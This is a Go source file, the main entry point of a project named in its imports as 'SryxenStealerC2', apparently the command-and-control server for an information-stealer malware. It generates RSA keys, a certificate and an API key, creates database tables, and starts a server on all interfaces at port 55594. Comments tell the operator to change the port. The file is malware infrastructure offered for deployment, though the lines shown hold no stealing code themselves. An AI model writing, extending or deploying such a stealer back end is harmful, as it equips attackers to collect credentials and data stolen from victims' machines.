package main

import (
	"fmt"
	"log"
	"os"
	"path/filepath"
	"SryxenStealerC2/Crypto"
	"SryxenStealerC2/LocalServer"
	"SryxenStealerC2/Server"
	"SryxenStealerC2/database"
	"SryxenStealerC2/api-key"
)

const (
	ForwardPort   = 55594 // change to your port
	PublicAddress = "0.0.0.0"

	LocalForwardPort = 55594 // change to your port
	LocalPublicAddr  = "127.0.0.1"
)

func isFirstRun() bool {
	certFile := filepath.Join("Certs", "certfile.pem")
	keyFile := filepath.Join("Certs", "keyfile.pem")
	apiKeyFile := "api_key.json"

	if _, err := os.Stat(certFile); os.IsNotExist(err) {
		return true
	}
	if _, err := os.Stat(keyFile); os.IsNotExist(err) {
		return true
	}
	if _, err := os.Stat(apiKeyFile); os.IsNotExist(err) {
		return true
	}
	return false
}

func main() {
	if isFirstRun() {
		fmt.Println("First run detected: Generating keys and initializing API key...")
		if err := Crypto.GenerateRSAKeys(); err != nil {
			log.Fatalf("Failed to generate keys and certificate: %v", err)
		}
		_, err := apiKey.InitializeAPIKey()
		if err != nil {
			log.Fatalf("Failed to initialize API key: %v", err)
		}
		fmt.Println("First run setup complete.")
	} else {
		fmt.Println("Existing setup detected: Certificates and API key found.")
	}

	if !database.CreateTables() {
		log.Fatalf("Failed to create database tables")
	} else {
		fmt.Println("Database and tables initialized successfully.")
	}

	serverMode := "NonLocal"

	go func() {
		if serverMode == "Local" {
			localServer := &LocalServer.LocalServerState{}
			fmt.Println("Starting Local server...")
			localServer.Run(LocalPublicAddr, LocalForwardPort)
		} else if serverMode == "NonLocal" {
			server := &Server.ServerState{}
			fmt.Println("Starting NonLocal server...")
			server.Run(PublicAddress, ForwardPort)
		}
	}()

	select {}
}
